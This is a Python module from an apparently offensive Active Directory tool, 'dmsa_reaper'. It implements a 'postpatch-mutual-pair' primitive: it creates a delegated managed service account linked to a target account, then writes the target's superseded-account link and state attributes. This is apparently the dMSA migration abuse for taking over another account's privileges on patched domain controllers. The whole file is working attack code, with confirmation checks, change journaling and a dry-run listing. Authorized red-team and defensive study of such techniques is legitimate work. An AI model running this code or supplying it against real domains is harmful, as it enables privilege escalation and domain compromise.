from __future__ import annotations

from typing import TYPE_CHECKING

from dmsa_reaper.ldap.modify import add_object, modify_attribute
from dmsa_reaper.models import AttributeChange, AttributeValue, Operation, PathCandidate
from dmsa_reaper.ops.operation_log import new_operation, save_operation
from dmsa_reaper.ops.verify import verify_operation_ldap
from dmsa_reaper.primitives._ldap_helpers import (
    DMSA_MANAGED_PASSWORD_INTERVAL,
    DMSA_OBJECT_CLASSES,
    DMSA_STATE_COMPLETED,
    DMSA_UAC,
    dmsa_dn,
    generate_dmsa_name,
    journal_created_object,
    read_attribute,
    resolve_meta,
)
from dmsa_reaper.primitives.base import Primitive, PrimitiveError

if TYPE_CHECKING:
    from ldap3 import Connection

# msDS-SupersededServiceAccountState value that activates the mutual-link handshake.
_STATE_ACTIVE = 2


class PostPatchMutualPairPrimitive(Primitive):
    """Create a dMSA and establish the mutual link required by patched DCs.

    Three LDAP writes in dependency order:
      1. Create new dMSA (with msDS-ManagedAccountPrecededByLink → target).
      2. Write target.msDS-SupersededManagedAccountLink  = dMSA DN.
      3. Write target.msDS-SupersededServiceAccountState = 2.

    Requires:
        - CreateChild:msDS-DelegatedManagedServiceAccount on the container.
        - WriteProperty:msDS-SupersededManagedAccountLink on the target.
        - WriteProperty:msDS-SupersededServiceAccountState on the target.
    """

    name = "postpatch-mutual-pair"

    def check(self, path: PathCandidate) -> bool:
        return (
            path.primitive == self.name
            and path.requires_modify_dmsa
            and path.requires_modify_target
        )

    def plan(self, path: PathCandidate) -> Operation:
        return new_operation(
            primitive=self.name,
            path_id=path.id,
            metadata={"path": path.model_dump()},
        )

    def execute(
        self,
        operation: Operation,
        *,
        confirm: bool = False,
        conn: "Connection | None" = None,
    ) -> Operation:
        if not confirm:
            raise PrimitiveError("--confirm is required for LDAP writes")
        if conn is None:
            raise PrimitiveError("--confirm requires an active LDAP connection")

        meta = operation.metadata
        container_dn = resolve_meta(meta, "container_dn")
        target_dn = resolve_meta(meta, "target_dn")
        if not container_dn:
            raise PrimitiveError("container_dn is required in operation metadata")
        if not target_dn:
            raise PrimitiveError(
                "target_dn is required in operation metadata (pass --target-dn)"
            )

        cn = generate_dmsa_name(meta.get("dmsa_name"))
        new_dn = dmsa_dn(cn, container_dn)
        sam = f"{cn}$"

        # Step 1 - create dMSA. Record intended DN as maybe-created before the
        # write so client-side LDAP exceptions preserve cleanup state.
        operation.status = "running"
        operation.maybe_created_dns.append(new_dn)
        operation.metadata["created_dmsa_dn"] = new_dn
        operation.metadata["created_dmsa_sam"] = sam
        save_operation(operation)

        try:
            add_object(
                conn,
                new_dn,
                DMSA_OBJECT_CLASSES,
                {
                    "sAMAccountName": sam,
                    "userAccountControl": DMSA_UAC,
                    "msDS-ManagedPasswordInterval": DMSA_MANAGED_PASSWORD_INTERVAL,
                    # State 2 = migration completed: required by the KDC.
                    "msDS-DelegatedMSAState": DMSA_STATE_COMPLETED,
                    "msDS-ManagedAccountPrecededByLink": target_dn,
                },
            )
            journal_created_object(operation, conn, new_dn)
        except Exception as exc:
            operation.status = "failed"
            operation.errors.append(f"add_object {new_dn}: {exc}")
            operation.metadata["execute_error"] = str(exc)
            save_operation(operation)
            raise

        if new_dn in operation.maybe_created_dns:
            operation.maybe_created_dns.remove(new_dn)
        operation.created_dns.append(new_dn)
        save_operation(operation)

        # Steps 2 & 3 - target-side writes.
        try:
            before_link = read_attribute(conn, target_dn, "msDS-SupersededManagedAccountLink")
            link_change = AttributeChange(
                dn=target_dn,
                attribute="msDS-SupersededManagedAccountLink",
                before=[AttributeValue.from_python(v) for v in before_link] if before_link else None,
                after=[AttributeValue.from_python(new_dn)],
                mode="replace",
                step_name="postpatch-link",
                step_status="planned",
            )
            operation.changed_attrs.append(link_change)
            save_operation(operation)
            modify_attribute(
                conn,
                target_dn,
                "msDS-SupersededManagedAccountLink",
                [new_dn],
                mode="replace",
            )
            link_change.step_status = "written"
            save_operation(operation)

            before_state = read_attribute(conn, target_dn, "msDS-SupersededServiceAccountState")
            state_change = AttributeChange(
                dn=target_dn,
                attribute="msDS-SupersededServiceAccountState",
                before=[AttributeValue.from_python(v) for v in before_state] if before_state else None,
                after=[AttributeValue.from_python(_STATE_ACTIVE)],
                mode="replace",
                step_name="postpatch-state",
                step_status="planned",
            )
            operation.changed_attrs.append(state_change)
            save_operation(operation)
            modify_attribute(
                conn,
                target_dn,
                "msDS-SupersededServiceAccountState",
                [_STATE_ACTIVE],
                mode="replace",
            )
            state_change.step_status = "written"
            save_operation(operation)

        except Exception as exc:
            operation.status = "partial-failed"
            operation.errors.append(f"target-side write {target_dn}: {exc}")
            operation.metadata["execute_error"] = str(exc)
            save_operation(operation)
            raise PrimitiveError(
                f"Execute failed at target-side write; partial state is recorded: {exc}"
            ) from exc

        operation.status = "executed"
        save_operation(operation)
        return operation

    def verify(self, operation: Operation, *, conn: "Connection | None" = None) -> bool:
        return verify_operation_ldap(operation, conn=conn)

    def dry_run_steps(self, operation: Operation) -> list[str]:
        meta = operation.metadata
        container_dn = resolve_meta(meta, "container_dn") or "<container_dn>"
        target_dn = resolve_meta(meta, "target_dn") or "<target_dn>"
        cn = generate_dmsa_name(meta.get("dmsa_name"))
        new_dn = dmsa_dn(cn, container_dn)
        sam = f"{cn}$"
        return [
            f"STEP 1  CREATE  {new_dn}",
            f"  object classes                          : {', '.join(DMSA_OBJECT_CLASSES)}",
            f"  sAMAccountName                          : {sam}",
            f"  userAccountControl                      : {DMSA_UAC}",
            f"  msDS-ManagedPasswordInterval            : {DMSA_MANAGED_PASSWORD_INTERVAL}",
            f"  msDS-DelegatedMSAState                  : {DMSA_STATE_COMPLETED}  (migration-completed)",
            f"  msDS-ManagedAccountPrecededByLink       : {target_dn}",
            "",
            f"STEP 2  MODIFY  {target_dn}",
            f"  msDS-SupersededManagedAccountLink       → {new_dn}",
            "",
            f"STEP 3  MODIFY  {target_dn}",
            f"  msDS-SupersededServiceAccountState      → {_STATE_ACTIVE}",
            "",
            "  (CN above is an example — a new random suffix is generated at execute time)",
        ]
